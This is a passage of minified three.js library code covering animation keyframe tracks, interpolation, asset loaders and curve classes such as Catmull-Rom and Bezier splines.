keyframes in track named "+e);this.name=e,this.times=Ns.convertArray(t,this.TimeBufferType),this.values=Ns.convertArray(n,this.ValueBufferType),this.setInterpolation(r||this.DefaultInterpolation)}function zs(e,t,n){$s.call(this,e,t,n)}function Hs(e,t,n,r){$s.call(this,e,t,n,r)}function Vs(e,t,n,r){$s.call(this,e,t,n,r)}function Qs(e,t,n,r){Ds.call(this,e,t,n,r)}function Gs(e,t,n,r){$s.call(this,e,t,n,r)}function Ws(e,t,n,r){$s.call(this,e,t,n,r)}function Ks(e,t,n,r){$s.call(this,e,t,n,r)}function qs(e,t,n,r){this.name=e,this.tracks=n,this.duration=void 0!==t?t:-1,this.blendMode=void 0!==r?r:2500,this.uuid=J.generateUUID(),this.duration<0&&this.resetDuration()}function Xs(e){if(void 0===e.type)throw new Error("THREE.KeyframeTrack: track type undefined, can not parse");var t=function(e){switch(e.toLowerCase()){case"scalar":case"double":case"float":case"number":case"integer":return Vs;case"vector":case"vector2":case"vector3":case"vector4":return Ks;case"color":return Hs;case"quaternion":return Gs;case"bool":case"boolean":return zs;case"string":return Ws}throw new Error("THREE.KeyframeTrack: Unsupported typeName: "+e)}(e.type);if(void 0===e.times){var n=[],r=[];Ns.flattenJSON(e.keys,n,r,"value"),e.times=n,e.values=r}return void 0!==t.parse?t.parse(e):new t(e.name,e.times,e.values,e.interpolation)}Object.assign(Ds.prototype,{evaluate:function(e){var t=this.parameterPositions,n=this._cachedIndex,r=t[n],i=t[n-1];e:{t:{var a;n:{r:if(!(e<r)){for(var o=n+2;;){if(void 0===r){if(e<i)break r;return n=t.length,this._cachedIndex=n,this.afterEnd_(n-1,e,i)}if(n===o)break;if(i=r,e<(r=t[++n]))break t}a=t.length;break n}if(i<=e)break e;var s=t[1];e<s&&(n=2,i=s);for(var l=n-2;;){if(void 0===i)return this._cachedIndex=0,this.beforeStart_(0,e,r);if(n===l)break;if(r=i,(i=t[--n-1])<=e)break t}a=n,n=0}for(;n<a;){var c=n+a>>>1;e<t[c]?a=c:n=c+1}if(r=t[n],void 0===(i=t[n-1]))return this._cachedIndex=0,this.beforeStart_(0,e,r);if(void 0===r)return n=t.length,this._cachedIndex=n,this.afterEnd_(n-1,i,e)}this._cachedIndex=n,this.intervalChanged_(n,i,r)}return this.interpolate_(n,i,e,r)},settings:null,DefaultSettings_:{},getSettings_:function(){return this.settings||this.DefaultSettings_},copySampleValue_:function(e){for(var t=this.resultBuffer,n=this.sampleValues,r=this.valueSize,i=e*r,a=0;a!==r;++a)t[a]=n[i+a];return t},interpolate_:function(){throw new Error("call to abstract method")},intervalChanged_:function(){}}),Object.assign(Ds.prototype,{beforeStart_:Ds.prototype.copySampleValue_,afterEnd_:Ds.prototype.copySampleValue_}),Rs.prototype=Object.assign(Object.create(Ds.prototype),{constructor:Rs,DefaultSettings_:{endingStart:2400,endingEnd:2400},intervalChanged_:function(e,t,n){var r=this.parameterPositions,i=e-2,a=e+1,o=r[i],s=r[a];if(void 0===o)switch(this.getSettings_().endingStart){case 2401:i=e,o=2*t-n;break;case 2402:o=t+r[i=r.length-2]-r[i+1];break;default:i=e,o=n}if(void 0===s)switch(this.getSettings_().endingEnd){case 2401:a=e,s=2*n-t;break;case 2402:s=n+r[a=1]-r[0];break;default:a=e-1,s=t}var l=.5*(n-t),c=this.valueSize;this._weightPrev=l/(t-o),this._weightNext=l/(s-n),this._offsetPrev=i*c,this._offsetNext=a*c},interpolate_:function(e,t,n,r){for(var i=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=e*o,l=s-o,c=this._offsetPrev,u=this._offsetNext,d=this._weightPrev,p=this._weightNext,h=(n-t)/(r-t),f=h*h,A=f*h,m=-d*A+2*d*f-d*h,v=(1+d)*A+(-1.5-2*d)*f+(-.5+d)*h+1,g=(-1-p)*A+(1.5+p)*f+.5*h,y=p*A-p*f,b=0;b!==o;++b)i[b]=m*a[c+b]+v*a[l+b]+g*a[s+b]+y*a[u+b];return i}}),js.prototype=Object.assign(Object.create(Ds.prototype),{constructor:js,interpolate_:function(e,t,n,r){for(var i=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=e*o,l=s-o,c=(n-t)/(r-t),u=1-c,d=0;d!==o;++d)i[d]=a[l+d]*u+a[s+d]*c;return i}}),Us.prototype=Object.assign(Object.create(Ds.prototype),{constructor:Us,interpolate_:function(e){return this.copySampleValue_(e-1)}}),Object.assign($s,{toJSON:function(e){var t,n=e.constructor;if(void 0!==n.toJSON)t=n.toJSON(e);else{t={name:e.name,times:Ns.convertArray(e.times,Array),values:Ns.convertArray(e.values,Array)};var r=e.getInterpolation();r!==e.DefaultInterpolation&&(t.interpolation=r)}return t.type=e.ValueTypeName,t}}),Object.assign($s.prototype,{constructor:$s,TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:2301,InterpolantFactoryMethodDiscrete:function(e){return new Us(this.times,this.values,this.getValueSize(),e)},InterpolantFactoryMethodLinear:function(e){return new js(this.times,this.values,this.getValueSize(),e)},InterpolantFactoryMethodSmooth:function(e){return new Rs(this.times,this.values,this.getValueSize(),e)},setInterpolation:function(e){var t;switch(e){case 2300:t=this.InterpolantFactoryMethodDiscrete;break;case 2301:t=this.InterpolantFactoryMethodLinear;break;case 2302:t=this.InterpolantFactoryMethodSmooth}if(void 0!==t)return this.createInterpolant=t,this;var n="unsupported interpolation for "+this.ValueTypeName+" keyframe track named "+this.name;if(void 0===this.createInterpolant){if(e===this.DefaultInterpolation)throw new Error(n);this.setInterpolation(this.DefaultInterpolation)}return this},getInterpolation:function(){switch(this.createInterpolant){case this.InterpolantFactoryMethodDiscrete:return 2300;case this.InterpolantFactoryMethodLinear:return 2301;case this.InterpolantFactoryMethodSmooth:return 2302}},getValueSize:function(){return this.values.length/this.times.length},shift:function(e){if(0!==e)for(var t=this.times,n=0,r=t.length;n!==r;++n)t[n]+=e;return this},scale:function(e){if(1!==e)for(var t=this.times,n=0,r=t.length;n!==r;++n)t[n]*=e;return this},trim:function(e,t){for(var n=this.times,r=n.length,i=0,a=r-1;i!==r&&n[i]<e;)++i;for(;-1!==a&&n[a]>t;)--a;if(++a,0!==i||a!==r){a<=i&&(i=(a=Math.max(a,1))-1);var o=this.getValueSize();this.times=Ns.arraySlice(n,i,a),this.values=Ns.arraySlice(this.values,i*o,a*o)}return this},validate:function(){var e=!0,t=this.getValueSize();t-Math.floor(t)!=0&&(e=!1);var n=this.times,r=this.values,i=n.length;0===i&&(e=!1);for(var a=null,o=0;o!==i;o++){var s=n[o];if("number"==typeof s&&isNaN(s)){e=!1;break}if(null!==a&&s<a){e=!1;break}a=s}if(void 0!==r&&Ns.isTypedArray(r))for(var l=0,c=r.length;l!==c;++l){var u=r[l];if(isNaN(u)){e=!1;break}}return e},optimize:function(){for(var e=Ns.arraySlice(this.times),t=Ns.arraySlice(this.values),n=this.getValueSize(),r=2302===this.getInterpolation(),i=e.length-1,a=1,o=1;o<i;++o){var s=!1,l=e[o];if(l!==e[o+1]&&(1!==o||l!==l[0]))if(r)s=!0;else for(var c=o*n,u=c-n,d=c+n,p=0;p!==n;++p){var h=t[c+p];if(h!==t[u+p]||h!==t[d+p]){s=!0;break}}if(s){if(o!==a){e[a]=e[o];for(var f=o*n,A=a*n,m=0;m!==n;++m)t[A+m]=t[f+m]}++a}}if(0<i){e[a]=e[i];for(var v=i*n,g=a*n,y=0;y!==n;++y)t[g+y]=t[v+y];++a}return a!==e.length?(this.times=Ns.arraySlice(e,0,a),this.values=Ns.arraySlice(t,0,a*n)):(this.times=e,this.values=t),this},clone:function(){var e=Ns.arraySlice(this.times,0),t=Ns.arraySlice(this.values,0),n=new this.constructor(this.name,e,t);return n.createInterpolant=this.createInterpolant,n}}),zs.prototype=Object.assign(Object.create($s.prototype),{constructor:zs,ValueTypeName:"bool",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0}),Hs.prototype=Object.assign(Object.create($s.prototype),{constructor:Hs,ValueTypeName:"color"}),Vs.prototype=Object.assign(Object.create($s.prototype),{constructor:Vs,ValueTypeName:"number"}),Qs.prototype=Object.assign(Object.create(Ds.prototype),{constructor:Qs,interpolate_:function(e,t,n,r){for(var i=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=(n-t)/(r-t),l=e*o,c=l+o;l!==c;l+=4)pe.slerpFlat(i,0,a,l-o,a,l,s);return i}}),Gs.prototype=Object.assign(Object.create($s.prototype),{constructor:Gs,ValueTypeName:"quaternion",DefaultInterpolation:2301,InterpolantFactoryMethodLinear:function(e){return new Qs(this.times,this.values,this.getValueSize(),e)},InterpolantFactoryMethodSmooth:void 0}),Ws.prototype=Object.assign(Object.create($s.prototype),{constructor:Ws,ValueTypeName:"string",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0}),Ks.prototype=Object.assign(Object.create($s.prototype),{constructor:Ks,ValueTypeName:"vector"}),Object.assign(qs,{parse:function(e){for(var t=[],n=e.tracks,r=1/(e.fps||1),i=0,a=n.length;i!==a;++i)t.push(Xs(n[i]).scale(r));return new qs(e.name,e.duration,t,e.blendMode)},toJSON:function(e){for(var t=[],n=e.tracks,r={name:e.name,duration:e.duration,tracks:t,uuid:e.uuid,blendMode:e.blendMode},i=0,a=n.length;i!==a;++i)t.push($s.toJSON(n[i]));return r},CreateFromMorphTargetSequence:function(e,t,n,r){for(var i=t.length,a=[],o=0;o<i;o++){var s=[],l=[];s.push((o+i-1)%i,o,(o+1)%i),l.push(0,1,0);var c=Ns.getKeyframeOrder(s);s=Ns.sortedArray(s,1,c),l=Ns.sortedArray(l,1,c),r||0!==s[0]||(s.push(i),l.push(l[0])),a.push(new Vs(".morphTargetInfluences["+t[o].name+"]",s,l).scale(1/n))}return new qs(e,-1,a)},findByName:function(e,t){var n=e;if(!Array.isArray(e)){var r=e;n=r.geometry&&r.geometry.animations||r.animations}for(var i=0;i<n.length;i++)if(n[i].name===t)return n[i];return null},CreateClipsFromMorphTargetSequences:function(e,t,n){for(var r={},i=/^([\w-]*?)([\d]+)$/,a=0,o=e.length;a<o;a++){var s=e[a],l=s.name.match(i);if(l&&1<l.length){var c=l[1],u=r[c];u||(r[c]=u=[]),u.push(s)}}var d=[];for(var p in r)d.push(qs.CreateFromMorphTargetSequence(p,r[p],t,n));return d},parseAnimation:function(e,t){if(!e)return null;for(var n=function(e,t,n,r,i){if(0!==n.length){var a=[],o=[];Ns.flattenJSON(n,a,o,r),0!==a.length&&i.push(new e(t,a,o))}},r=[],i=e.name||"default",a=e.fps||30,o=e.blendMode,s=e.length||-1,l=e.hierarchy||[],c=0;c<l.length;c++){var u=l[c].keys;if(u&&0!==u.length)if(u[0].morphTargets){var d={},p=void 0;for(p=0;p<u.length;p++)if(u[p].morphTargets)for(var h=0;h<u[p].morphTargets.length;h++)d[u[p].morphTargets[h]]=-1;for(var f in d){for(var A=[],m=[],v=0;v!==u[p].morphTargets.length;++v){var g=u[p];A.push(g.time),m.push(g.morphTarget===f?1:0)}r.push(new Vs(".morphTargetInfluence["+f+"]",A,m))}s=d.length*(a||1)}else{var y=".bones["+t[c].name+"]";n(Ks,y+".position",u,"pos",r),n(Gs,y+".quaternion",u,"rot",r),n(Ks,y+".scale",u,"scl",r)}}return 0===r.length?null:new qs(i,s,r,o)}}),Object.assign(qs.prototype,{resetDuration:function(){for(var e=0,t=0,n=this.tracks.length;t!==n;++t){var r=this.tracks[t];e=Math.max(e,r.times[r.times.length-1])}return this.duration=e,this},trim:function(){for(var e=0;e<this.tracks.length;e++)this.tracks[e].trim(0,this.duration);return this},validate:function(){for(var e=!0,t=0;t<this.tracks.length;t++)e=e&&this.tracks[t].validate();return e},optimize:function(){for(var e=0;e<this.tracks.length;e++)this.tracks[e].optimize();return this},clone:function(){for(var e=[],t=0;t<this.tracks.length;t++)e.push(this.tracks[t].clone());return new qs(this.name,this.duration,e,this.blendMode)}});var Ys={enabled:!1,files:{},add:function(e,t){!1!==this.enabled&&(this.files[e]=t)},get:function(e){if(!1!==this.enabled)return this.files[e]},remove:function(e){delete this.files[e]},clear:function(){this.files={}}};function Js(e,t,n){var r=this,i=!1,a=0,o=0,s=void 0,l=[];this.onStart=void 0,this.onLoad=e,this.onProgress=t,this.onError=n,this.itemStart=function(e){o++,!1===i&&void 0!==r.onStart&&r.onStart(e,a,o),i=!0},this.itemEnd=function(e){a++,void 0!==r.onProgress&&r.onProgress(e,a,o),a===o&&(i=!1,void 0!==r.onLoad&&r.onLoad())},this.itemError=function(e){void 0!==r.onError&&r.onError(e)},this.resolveURL=function(e){return s?s(e):e},this.setURLModifier=function(e){return s=e,this},this.addHandler=function(e,t){return l.push(e,t),this},this.removeHandler=function(e){var t=l.indexOf(e);return-1!==t&&l.splice(t,2),this},this.getHandler=function(e){for(var t=0,n=l.length;t<n;t+=2){var r=l[t],i=l[t+1];if(r.global&&(r.lastIndex=0),r.test(e))return i}return null}}var Zs=new Js;function el(e){this.manager=void 0!==e?e:Zs,this.crossOrigin="anonymous",this.withCredentials=!1,this.path="",this.resourcePath="",this.requestHeader={}}Object.assign(el.prototype,{load:function(){},loadAsync:function(e,t){var n=this;return new Promise((function(r,i){n.load(e,r,t,i)}))},parse:function(){},setCrossOrigin:function(e){return this.crossOrigin=e,this},setWithCredentials:function(e){return this.withCredentials=e,this},setPath:function(e){return this.path=e,this},setResourcePath:function(e){return this.resourcePath=e,this},setRequestHeader:function(e){return this.requestHeader=e,this}});var tl={};function nl(e){el.call(this,e)}function rl(e){el.call(this,e)}function il(e){el.call(this,e)}function al(e){el.call(this,e)}function ol(e){el.call(this,e)}function sl(e){el.call(this,e)}function ll(e){el.call(this,e)}function cl(){this.type="Curve",this.arcLengthDivisions=200}function ul(e,t,n,r,i,a,o,s){cl.call(this),this.type="EllipseCurve",this.aX=e||0,this.aY=t||0,this.xRadius=n||1,this.yRadius=r||1,this.aStartAngle=i||0,this.aEndAngle=a||2*Math.PI,this.aClockwise=o||!1,this.aRotation=s||0}function dl(e,t,n,r,i,a){ul.call(this,e,t,n,n,r,i,a),this.type="ArcCurve"}function pl(){var e=0,t=0,n=0,r=0;function i(i,a,o,s){n=-3*(e=i)+3*a-2*(t=o)-s,r=2*i-2*a+o+s}return{initCatmullRom:function(e,t,n,r,a){i(t,n,a*(n-e),a*(r-t))},initNonuniformCatmullRom:function(e,t,n,r,a,o,s){var l=(t-e)/a-(n-e)/(a+o)+(n-t)/o,c=(n-t)/o-(r-t)/(o+s)+(r-n)/s;i(t,n,l*=o,c*=o)},calc:function(i){var a=i*i;return e+t*i+n*a+r*(a*i)}}}nl.prototype=Object.assign(Object.create(el.prototype),{constructor:nl,load:function(e,t,n,r){void 0===e&&(e=""),void 0!==this.path&&(e=this.path+e),e=this.manager.resolveURL(e);var i=this,a=Ys.get(e);if(void 0!==a)return i.manager.itemStart(e),setTimeout((function(){t&&t(a),i.manager.itemEnd(e)}),0),a;if(void 0===tl[e]){var o,s=e.match(/^data:(.*?)(;base64)?,(.*)$/);if(s){var l=s[1],c=!!s[2],u=s[3];u=decodeURIComponent(u),c&&(u=atob(u));try{var d,p=(this.responseType||"").toLowerCase();switch(p){case"arraybuffer":case"blob":for(var h=new Uint8Array(u.length),f=0;f<u.length;f++)h[f]=u.charCodeAt(f);d="blob"===p?new Blob([h.buffer],{type:l}):h.buffer;break;case"document":var A=new DOMParser;d=A.parseFromString(u,l);break;case"json":d=JSON.parse(u);break;default:d=u}setTimeout((function(){t&&t(d),i.manager.itemEnd(e)}),0)}catch(t){setTimeout((function(){r&&r(t),i.manager.itemError(e),i.manager.itemEnd(e)}),0)}}else{for(var m in tl[e]=[],tl[e].push({onLoad:t,onProgress:n,onError:r}),(o=new XMLHttpRequest).open("GET",e,!0),o.addEventListener("load",(function(t){var n=this.response,r=tl[e];if(delete tl[e],200===this.status||0===this.status){this.status,Ys.add(e,n);for(var a=0,o=r.length;a<o;a++){var s=r[a];s.onLoad&&s.onLoad(n)}i.manager.itemEnd(e)}else{for(var l=0,c=r.length;l<c;l++){var u=r[l];u.onError&&u.onError(t)}i.manager.itemError(e),i.manager.itemEnd(e)}}),!1),o.addEventListener("progress",(function(t){for(var n=tl[e],r=0,i=n.length;r<i;r++){var a=n[r];a.onProgress&&a.onProgress(t)}}),!1),o.addEventListener("error",(function(t){var n=tl[e];delete tl[e];for(var r=0,a=n.length;r<a;r++){var o=n[r];o.onError&&o.onError(t)}i.manager.itemError(e),i.manager.itemEnd(e)}),!1),o.addEventListener("abort",(function(t){var n=tl[e];delete tl[e];for(var r=0,a=n.length;r<a;r++){var o=n[r];o.onError&&o.onError(t)}i.manager.itemError(e),i.manager.itemEnd(e)}),!1),void 0!==this.responseType&&(o.responseType=this.responseType),void 0!==this.withCredentials&&(o.withCredentials=this.withCredentials),o.overrideMimeType&&o.overrideMimeType(void 0!==this.mimeType?this.mimeType:"text/plain"),this.requestHeader)o.setRequestHeader(m,this.requestHeader[m]);o.send(null)}return i.manager.itemStart(e),o}tl[e].push({onLoad:t,onProgress:n,onError:r})},setResponseType:function(e){return this.responseType=e,this},setMimeType:function(e){return this.mimeType=e,this}}),rl.prototype=Object.assign(Object.create(el.prototype),{constructor:rl,load:function(e,t,n,r){var i=this,a=new nl(i.manager);a.setPath(i.path),a.setRequestHeader(i.requestHeader),a.setWithCredentials(i.withCredentials),a.load(e,(function(n){try{t(i.parse(JSON.parse(n)))}catch(n){r&&r(n),i.manager.itemError(e)}}),n,r)},parse:function(e){for(var t=[],n=0;n<e.length;n++){var r=qs.parse(e[n]);t.push(r)}return t}}),il.prototype=Object.assign(Object.create(el.prototype),{constructor:il,load:function(e,t,n,r){var i=this,a=[],o=new Za;o.image=a;var s=new nl(this.manager);s.setPath(this.path),s.setResponseType("arraybuffer"),s.setRequestHeader(this.requestHeader),s.setWithCredentials(i.withCredentials);var l=0;function c(c){s.load(e[c],(function(e){var n=i.parse(e,!0);a[c]={width:n.width,height:n.height,format:n.format,mipmaps:n.mipmaps},6===(l+=1)&&(1===n.mipmapCount&&(o.minFilter=f),o.format=n.format,o.needsUpdate=!0,t&&t(o))}),n,r)}if(Array.isArray(e))for(var u=0,d=e.length;u<d;++u)c(u);else s.load(e,(function(e){var n=i.parse(e,!0);if(n.isCubemap)for(var r=n.mipmaps.length/n.mipmapCount,s=0;s<r;s++){a[s]={mipmaps:[]};for(var l=0;l<n.mipmapCount;l++)a[s].mipmaps.push(n.mipmaps[s*n.mipmapCount+l]),a[s].format=n.format,a[s].width=n.width,a[s].height=n.height}else o.image.width=n.width,o.image.height=n.height,o.mipmaps=n.mipmaps;1===n.mipmapCount&&(o.minFilter=f),o.format=n.format,o.needsUpdate=!0,t&&t(o)}),n,r);return o}}),al.prototype=Object.assign(Object.create(el.prototype),{constructor:al,load:function(e,t,n,r){void 0!==this.path&&(e=this.path+e),e=this.manager.resolveURL(e);var i=this,a=Ys.get(e);if(void 0!==a)return i.manager.itemStart(e),setTimeout((function(){t&&t(a),i.manager.itemEnd(e)}),0),a;var o=document.createElementNS("http://www.w3.org/1999/xhtml","img");function s(){o.removeEventListener("load",s,!1),o.removeEventListener("error",l,!1),Ys.add(e,this),t&&t(this),i.manager.itemEnd(e)}function l(t){o.removeEventListener("load",s,!1),o.removeEventListener("error",l,!1),r&&r(t),i.manager.itemError(e),i.manager.itemEnd(e)}return o.addEventListener("load",s,!1),o.addEventListener("error",l,!1),"data:"!==e.substr(0,5)&&void 0!==this.crossOrigin&&(o.crossOrigin=this.crossOrigin),i.manager.itemStart(e),o.src=e,o}}),ol.prototype=Object.assign(Object.create(el.prototype),{constructor:ol,load:function(e,t,n,r){var i=new Nn,a=new al(this.manager);a.setCrossOrigin(this.crossOrigin),a.setPath(this.path);var o=0;function s(n){a.load(e[n],(function(e){i.images[n]=e,6==++o&&(i.needsUpdate=!0,t&&t(i))}),void 0,r)}for(var l=0;l<e.length;++l)s(l);return i}}),sl.prototype=Object.assign(Object.create(el.prototype),{constructor:sl,load:function(e,t,n,r){var i=this,a=new Rn,o=new nl(this.manager);return o.setResponseType("arraybuffer"),o.setRequestHeader(this.requestHeader),o.setPath(this.path),o.setWithCredentials(i.withCredentials),o.load(e,(function(e){var n=i.parse(e);n&&(void 0!==n.image?a.image=n.image:void 0!==n.data&&(a.image.width=n.width,a.image.height=n.height,a.image.data=n.data),a.wrapS=void 0!==n.wrapS?n.wrapS:c,a.wrapT=void 0!==n.wrapT?n.wrapT:c,a.magFilter=void 0!==n.magFilter?n.magFilter:f,a.minFilter=void 0!==n.minFilter?n.minFilter:f,a.anisotropy=void 0!==n.anisotropy?n.anisotropy:1,void 0!==n.format&&(a.format=n.format),void 0!==n.type&&(a.type=n.type),void 0!==n.mipmaps&&(a.mipmaps=n.mipmaps,a.minFilter=m),1===n.mipmapCount&&(a.minFilter=f),a.needsUpdate=!0,t&&t(a,n))}),n,r),a}}),ll.prototype=Object.assign(Object.create(el.prototype),{constructor:ll,load:function(e,t,n,r){var i=new le,a=new al(this.manager);return a.setCrossOrigin(this.crossOrigin),a.setPath(this.path),a.load(e,(function(n){i.image=n;var r=0<e.search(/\.jpe?g($|\?)/i)||0===e.search(/^data\:image\/jpeg/);i.format=r?C:x,i.needsUpdate=!0,void 0!==t&&t(i)}),n,r),i}}),Object.assign(cl.prototype,{getPoint:function(){return null},getPointAt:function(e,t){var n=this.getUtoTmapping(e);return this.getPoint(n,t)},getPoints:function(e){void 0===e&&(e=5);for(var t=[],n=0;n<=e;n++)t.push(this.getPoint(n/e));return t},getSpacedPoints:function(e){void 0===e&&(e=5);for(var t=[],n=0;n<=e;n++)t.push(this.getPointAt(n/e));return t},getLength:function(){var e=this.getLengths();return e[e.length-1]},getLengths:function(e){if(void 0===e&&(e=this.arcLengthDivisions),this.cacheArcLengths&&this.cacheArcLengths.length===e+1&&!this.needsUpdate)return this.cacheArcLengths;this.needsUpdate=!1;var t,n=[],r=this.getPoint(0),i=0;n.push(0);for(var a=1;a<=e;a++)i+=(t=this.getPoint(a/e)).distanceTo(r),n.push(i),r=t;return this.cacheArcLengths=n},updateArcLengths:function(){this.needsUpdate=!0,this.getLengths()},getUtoTmapping:function(e,t){var n,r=this.getLengths(),i=0,a=r.length;n=t||e*r[a-1];for(var o,s=0,l=a-1;s<=l;)if((o=r[i=Math.floor(s+(l-s)/2)]-n)<0)s=i+1;else{if(!(0<o)){l=i;break}l=i-1}if(r[i=l]===n)return i/(a-1);var c=r[i];return(i+(n-c)/(r[i+1]-c))/(a-1)},getTangent:function(e,t){var n=e-1e-4,r=e+1e-4;n<0&&(n=0),1<r&&(r=1);var i=this.getPoint(n),a=this.getPoint(r),o=t||(i.isVector2?new ie:new he);return o.copy(a).sub(i).normalize(),o},getTangentAt:function(e,t){var n=this.getUtoTmapping(e);return this.getTangent(n,t)},computeFrenetFrames:function(e,t){for(var n=new he,r=[],i=[],a=[],o=new he,s=new $e,l=0;l<=e;l++){var c=l/e;r[l]=this.getTangentAt(c,new he),r[l].normalize()}i[0]=new he,a[0]=new he;var u=Number.MAX_VALUE,d=Math.abs(r[0].x),p=Math.abs(r[0].y),h=Math.abs(r[0].z);d<=u&&(u=d,n.set(1,0,0)),p<=u&&(u=p,n.set(0,1,0)),h<=u&&n.set(0,0,1),o.crossVectors(r[0],n).normalize(),i[0].crossVectors(r[0],o),a[0].crossVectors(r[0],i[0]);for(var f=1;f<=e;f++){if(i[f]=i[f-1].clone(),a[f]=a[f-1].clone(),o.crossVectors(r[f-1],r[f]),o.length()>Number.EPSILON){o.normalize();var A=Math.acos(J.clamp(r[f-1].dot(r[f]),-1,1));i[f].applyMatrix4(s.makeRotationAxis(o,A))}a[f].crossVectors(r[f],i[f])}if(!0===t){var m=Math.acos(J.clamp(i[0].dot(i[e]),-1,1));m/=e,0<r[0].dot(o.crossVectors(i[0],i[e]))&&(m=-m);for(var v=1;v<=e;v++)i[v].applyMatrix4(s.makeRotationAxis(r[v],m*v)),a[v].crossVectors(r[v],i[v])}return{tangents:r,normals:i,binormals:a}},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.arcLengthDivisions=e.arcLengthDivisions,this},toJSON:function(){var e={metadata:{version:4.5,type:"Curve",generator:"Curve.toJSON"}};return e.arcLengthDivisions=this.arcLengthDivisions,e.type=this.type,e},fromJSON:function(e){return this.arcLengthDivisions=e.arcLengthDivisions,this}}),((ul.prototype=Object.create(cl.prototype)).constructor=ul).prototype.isEllipseCurve=!0,ul.prototype.getPoint=function(e,t){for(var n=t||new ie,r=2*Math.PI,i=this.aEndAngle-this.aStartAngle,a=Math.abs(i)<Number.EPSILON;i<0;)i+=r;for(;r<i;)i-=r;i<Number.EPSILON&&(i=a?0:r),!0!==this.aClockwise||a||(i===r?i=-r:i-=r);var o=this.aStartAngle+e*i,s=this.aX+this.xRadius*Math.cos(o),l=this.aY+this.yRadius*Math.sin(o);if(0!==this.aRotation){var c=Math.cos(this.aRotation),u=Math.sin(this.aRotation),d=s-this.aX,p=l-this.aY;s=d*c-p*u+this.aX,l=d*u+p*c+this.aY}return n.set(s,l)},ul.prototype.copy=function(e){return cl.prototype.copy.call(this,e),this.aX=e.aX,this.aY=e.aY,this.xRadius=e.xRadius,this.yRadius=e.yRadius,this.aStartAngle=e.aStartAngle,this.aEndAngle=e.aEndAngle,this.aClockwise=e.aClockwise,this.aRotation=e.aRotation,this},ul.prototype.toJSON=function(){var e=cl.prototype.toJSON.call(this);return e.aX=this.aX,e.aY=this.aY,e.xRadius=this.xRadius,e.yRadius=this.yRadius,e.aStartAngle=this.aStartAngle,e.aEndAngle=this.aEndAngle,e.aClockwise=this.aClockwise,e.aRotation=this.aRotation,e},ul.prototype.fromJSON=function(e){return cl.prototype.fromJSON.call(this,e),this.aX=e.aX,this.aY=e.aY,this.xRadius=e.xRadius,this.yRadius=e.yRadius,this.aStartAngle=e.aStartAngle,this.aEndAngle=e.aEndAngle,this.aClockwise=e.aClockwise,this.aRotation=e.aRotation,this},((dl.prototype=Object.create(ul.prototype)).constructor=dl).prototype.isArcCurve=!0;var hl=new he,fl=new pl,Al=new pl,ml=new pl;function vl(e,t,n,r){cl.call(this),this.type="CatmullRomCurve3",this.points=e||[],this.closed=t||!1,this.curveType=n||"centripetal",this.tension=void 0!==r?r:.5}function gl(e,t,n,r,i){var a=.5*(r-t),o=.5*(i-n),s=e*e;return(2*n-2*r+a+o)*(e*s)+(-3*n+3*r-2*a-o)*s+a*e+n}function yl(e,t,n,r){return(o=1-e)*o*t+2*(1-(a=e))*a*n+(i=e)*i*r;var i,a,o}function bl(e,t,n,r,i){return(c=1-e)*c*c*t+3*(l=1-(s=e))*l*s*n+3*(1-(o=e))*o*o*r+(a=e)*a*a*i;var a,o,s,l,c}function _l(e,t,n,r){cl.call(this),this.type="CubicBezierCurve",this.v0=e||new ie,this.v1=t||new ie,this.v2=n||new ie,this.v3=r||new ie}function wl(e,t,n,r){cl.call(this),this.type="CubicBezierCurve3",this.v0=e||new he,this.v1=t||new he,this.v2=n||new he,this.v3=r||new he}function Cl(e,t){cl.call(this),this.type="LineCurve",this.v1=e||new ie,this.v2=t||new ie}function xl(e,t){cl.call(this),this.type="LineCurve3",this.v1=e||new he,this.v2=t||new he}function Sl(e,t,n){cl.call(this),this.type="QuadraticBezierCurve",this.v0=e||new ie,this.v1=t||new ie,this.v2=n||new ie}function kl(e,t,n){cl.call(this),this.type="QuadraticBezierCurve3",this.v0=e||new he,this.v1=t||new he,this.v2=n||new he}function Ml(e){cl.call(this),this.type="SplineCurve",this.points=e||[]}((vl.prototype=Object.create(cl.prototype)).constructor=vl).prototype.isCatmullRomCurve3=!0,vl.prototype.getPoint=function(e,t){var n,r,i=t||new he,a=this.points,o=a.length,s=(o-(this.closed?0:1))*e,l=Math.floor(s),c=s-l;this.closed?l+=0<l?0:(Math.floor(Math.abs(l)/o)+1)*o:0===c&&l===o-1&&(l=o-2,c=1),n=this.closed||0<l?a[(l-1)%o]:(hl.subVectors(a[0],a[1]).add(a[0]),hl);var u=a[l%o],d=a[(l+1)%o];if(r=this.closed||l+2<o?a[(l+2)%o]:(hl.subVectors(a[o-1],a[o-2]).add(a[o-1]),hl),"centripetal"===this.curveType||"chordal"===this.curveType){var p="chordal"===this.curveType?.5:.25,h=Math.pow(n.distanceToSquared(u),p),f=Math.pow(u.distanceToSquared(d),p),A=Math.pow(d.distanceToSquared(r),p);f<1e-4&&(f=1),h<1e-4&&(h=f),A<1e-4&&(A=f),fl.initNonuniformCatmullRom(n.x,u.x,d.x,r.x,h,f,A),Al.initNonuniformCatmullRom(n.y,u.y,d.y,r.y,h,f,A),ml.initNonuniformCatmullRom(n.z,u.z,d.z,r.z,h,f,A)}else"catmullrom"===this.curveType&&(fl.initCatmullRom(n.x,u.x,d.x,r.x,this.tension),Al.initCatmullRom(n.y,u.y,d.y,r.y,this.tension),ml.initCatmullRom(n.z,u.z,d.z,r.z,this.tension));return i.set(fl.calc(c),Al.calc(c),ml.calc(c)),i},vl.prototype.copy=function(e){cl.prototype.copy.call(this,e),this.points=[];for(var t=0,n=e.points.length;t<n;t++){var r=e.points[t];this.points.push(r.clone())}return this.closed=e.closed,this.curveType=e.curveType,this.tension=e.tension,this},vl.prototype.toJSON=function(){var e=cl.prototype.toJSON.call(this);e.points=[];for(var t=0,n=this.points.length;t<n;t++){var r=this.points[t];e.points.push(r.toArray())}return e.closed=this.closed,e.curveType=this.curveType,e.tension=this.tension,e},vl.prototype.fromJSON=function(e){cl.prototype.fromJSON.call(this,e),this.points=[];for(var t=0,n=e.points.length;t<n;t++){var r=e.points[t];this.points.push((new he).fromArray(r))}return 